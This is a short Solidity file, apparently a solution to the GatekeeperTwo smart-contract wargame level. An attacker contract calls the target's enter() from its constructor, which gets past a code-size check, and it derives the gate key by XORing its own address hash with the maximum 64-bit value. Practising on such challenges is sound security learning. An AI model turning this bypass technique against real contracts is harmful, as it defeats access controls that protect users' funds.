// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperTwo.sol";
import "hardhat/console.sol";
interface IGatekeeper {
  function enter(bytes8 _gateKey) external returns (bool);
} 

contract GatekeeperTwoAttacker {

  constructor(address _gateKeeper) {
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    //bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF);
    //console.log("pippo");
    GatekeeperTwo(_gateKeeper).enter(key);
    return;
  }
}